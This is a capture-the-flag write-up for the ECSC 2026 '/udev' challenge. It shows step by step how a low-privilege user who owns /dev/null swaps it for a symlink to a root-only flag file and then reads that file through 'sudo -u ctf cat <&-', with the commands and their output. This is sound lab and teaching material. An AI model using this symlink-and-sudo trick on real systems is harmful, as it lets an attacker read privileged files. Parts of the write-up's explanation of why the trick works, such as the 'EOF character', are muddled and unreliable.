---
title: ECSC 2026 Finals - /udev - true innovation - 9 solves
published: true
category: misc
tags: [linux, symlink, sudo]
difficulty: medium
---

# /udev - true innovation - misc

_author: Firzen_

- Challenge description:

> You may have heard of FUSE and UBLK, but those are just bandaids that don't address the core issue Introducing "/udev", finally giving the users full control over the /dev filesystem. You don't need to be root anymore if you can just alter /dev as a low priv user :9Head:.

- Number of solves: `9`
- Points: `484`

attachments:

- [slash-udev.zip](https://files.ecsc2026.de/99ec6016990fdf2e8cfe816ffa52fe14683eff2468850fd0c44e425a19731f8b/slash-udev.zip)

## tl;dr

1. Remove `/dev/null`
2. symlink root's `/flag.txt` to `/dev/null`
3. Using modified sudo for passwordless `ctf` account, `cat` from the EOF file descriptor, which is essentially coming from `/dev/null` in linux

## The Challenge

We are given files `Dockerfile` and `run.sh`. The `Dockerfile` is som ubuntu image and we can connect to it via ssh to the passwordless `ctf` user. The flag is owned and readable by the root at `/flag.txt`. Purely reading it as the `ctf` user results in:

```output
ctf@slash-udev-pod-main-slash-udev-479rf:/dev$ cat /flag.txt
cat: /flag.txt: Permission denied
ctf@slash-udev-pod-main-slash-udev-479rf:/dev$
```

The `run.sh` script sets up the `sshd` which opens the possibility for `ssh` connections to the server.

The instancer gave straightforward copy-paste command to do that (no challenge there.):

```bash
ssh 7lryjs7se2uikmwauifqq7hsmh-main-3000-slash-udev@ecsc.jetzt
```

Aside from that, the `run.sh` script makes the `ctf` user fully own `/dev` and `/dev/null`.

[`/dev`](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/dev.html) is the location in linux for special or devices files. [`/dev/null`](https://www.digitalocean.com/community/tutorials/dev-null-in-linux) is like an ultimate trash, whatever get written to it, will be discarded. When we try to read it with

```bash
cat /dev/null`
```

we get seemingly "nothing", but in reality, we get the **End of File (EOF) character**.

One more important thing for the challenge is that the `Dockerfile` is building it's own version of `sudo` from specific [`sudo-project`](https://github.com/sudo-project/sudo/) branch: `git clone --depth=1 --branch v1.9.17p2 https://github.com/sudo-project/sudo/`, which is actually last release, however this was a red herring.

## The Solution

### links

As you might know, in linux [everything is a file](https://en.wikipedia.org/wiki/Everything_is_a_file), so we can remove `/dev/null`, and create a [soft symlink](https://www.redhat.com/en/blog/linking-linux-explained) to `/flag.txt` in its place.

The _link_ is between the filename and the actual data stored on the filesystem. A hard link is considered even when **creating a file** - we associate the filename with its contents. We can also create a new hard link with the use of `ln <original path> <new link path>`. That will create 2 filenames pointing to the same file body.

When you create a file with e.g.:

```bash
echo "hi" > a.txt
```

the output of `ls -al` will present the following:

```
total 0
drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:38 .
drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:38 ..
-rwxrwxrwx 1 ubuntu ubuntu    3 Oct 14 01:38 a.txt
```

The mysterious `1` between the permissions (`-rwxrwxrwx`) and the user (`ubuntu`), is the **amount of hard links** of the content under that filename. When we would create a hard link `b.txt`:

```bash
ln a.txt b.txt
```

We can see that the number increased to 2 in the `ls -al` output:

```
total 0
drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:40 .
drwxrwxrwx 1 ubuntu ubuntu 4096 Oct 14 01:38 ..
-rwxrwxrwx 2 ubuntu ubuntu    3 Oct 14 01:38 a.txt
-rwxrwxrwx 2 ubuntu ubuntu    3 Oct 14 01:38 b.txt
```

If you'd like to inspect which links are pointing to the same content, you can do so with the use of `ls -li`, and it will additionally prepend the `inode` number associated with the specific content:

```
total 0
9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 a.txt
9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 b.txt
```

and here the `inode` is naturally the same.

---

Soft links (also known as _symbolic links_) can link together non-regular and regular files and they work across multiple filesystems. Soft link is not a standard file. In order to create a soft link, you need to add `-s` flag:

```bash
ln -s a.txt c.txt
```

after `ls -li` we can see a different `inode` number, and a special presentation by `ls`, as softlinks are special kind of files:

```
total 0
 9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 a.txt
 9570149208518500 -rwxrwxrwx 2 ubuntu ubuntu 3 Oct 14 01:38 b.txt
12103423999168826 lrwxrwxrwx 1 ubuntu ubuntu 5 Oct 14 01:45 c.txt -> a.txt
```

When we delete the original of the hard link, we could still read the hard link contents, as it points to content, however soft link after removing the original filename will be broken and will just say that the file or directory doesn't exist.

### first part of the trick

As you already know, `/dev/null` is a file - can be read from and written to.

As `ctf` user we own it, so we can delete it:

```bash
rm /dev/null
```

Then we need to create a _soft_ link, from `flag.txt` to `/dev/null`. Our link is the `null` filename in `/dev`. It can't be a hard link, because we would get the following error: `ln: failed to create hard link '/dev/null' => '/flag.txt': Invalid cross-device link`. Soft links are more flexible, and we can create a soft link from (I think) anything.

```bash
ln -s /flag.txt /dev/null
```

after inspecting `/dev` with `ls -li /dev` we can see the `null` pointing at `/flag.txt`:

```bash
ctf@slash-udev-pod-main-slash-udev-sw46h:~$ ls -li /dev
total 0
        13 lrwxrwxrwx 1 root root   13 Oct 13 23:56 fd -> /proc/self/fd
         8 crw-rw-rw- 1 root root 1, 7 Oct 13 23:56 full
  72127127 drwxrwxrwt 2 root root   40 Oct 13 23:56 mqueue
        17 lrwxrwxrwx 1 ctf  ctf     9 Oct 13 23:58 null -> /flag.txt
        12 lrwxrwxrwx 1 root root    8 Oct 13 23:56 ptmx -> pts/ptmx
         1 drwxr-xr-x 2 root root    0 Oct 13 23:56 pts
         7 crw-rw-rw- 1 root root 1, 8 Oct 13 23:56 random
         1 drwxrwxrwt 2 root root   40 Oct 13 23:56 shm
        16 lrwxrwxrwx 1 root root   15 Oct 13 23:56 stderr -> /proc/self/fd/2
        14 lrwxrwxrwx 1 root root   15 Oct 13 23:56 stdin -> /proc/self/fd/0
        15 lrwxrwxrwx 1 root root   15 Oct 13 23:56 stdout -> /proc/self/fd/1
6308726851 -rw-rw-rw- 1 root root    0 Oct 13 23:56 termination-log
         9 crw-rw-rw- 1 root root 5, 0 Oct 13 23:56 tty
        11 crw-rw-rw- 1 root root 1, 9 Oct 13 23:56 urandom
        10 crw-rw-rw- 1 root root 1, 5 Oct 13 23:56 zero
ctf@slash-udev-pod-main-slash-udev-sw46h:~$
```

However we still can't read it, because the file ownership is still by `root`, however it's worth remembering that whenever we have some **inaccessible file**, then unless an explicit `/readflag` binary is there, **symbolic links should pop into our heads to test for**.

```bash
ctf@slash-udev-pod-main-slash-udev-sw46h:~$ cat /dev/null
cat: /dev/null: Permission denied
ctf@slash-udev-pod-main-slash-udev-sw46h:~$
```

### second part of the trick

To understand the trick, you need to know 3 basics of linux:

1. `<` is the basic redirection operator for input.
2. `&` tells the shall, that the next following character, will be a [file descriptor](https://en.wikipedia.org/wiki/File_descriptor) (FD). E.g.: `0` character is the file descriptor for `stdin` (Standard input).
3. `-` after `&` is a specific shell syntax used to **close** a file descriptor; which basically means immediately return `EOF`. _(do you remember what happens what we get when we read /dev/null normally?)_
4. `sudo -u` tells to execute a program as a specific user other than the default `root` user. By default typing `sudo <command>` would tell linux `run the command as root`, but when we specify the `-u` we tell to run the command as the specified user. `sudo` itself is an elevated binary as it needs to be because of the user accesses and all.

So having that out of the way, we can now construct the final payload:

```bash
sudo -u ctf cat <&-
```

is basically doing:

1. run as user `ctf` (allowed because we already are `ctf` and can use `sudo`) the command `cat` (which we also have access to, because it's normal to read stuff :))
2. redirect the input FROM (3.) with `<`
3. we will be seeing a file descriptor because we have `&` present now...
4. `-` after `&` means "let's close this file descriptor immediately", so it's serving the `EOF` character.. but wait - the place that contains the `EOF` character was changed... it's a symlink to `/flag.txt` now, so that means the _privileged_ `sudo` program is actually getting the input from content at `/flag.txt`, and displaying it to us with the use of `cat`:

```
ctf@slash-udev-pod-main-slash-udev-sw46h:~$ sudo -u ctf cat <&-
ECSC{seizing_the_means_of_corruption}ctf@slash-udev-pod-main-slash-udev-sw46h:~$
```

## afterthoughts

Although I didn't manage to solve the challenge in time, I really enjoyed learning about it afterwards. It's a nice trick that definitely might come in handy in the future!
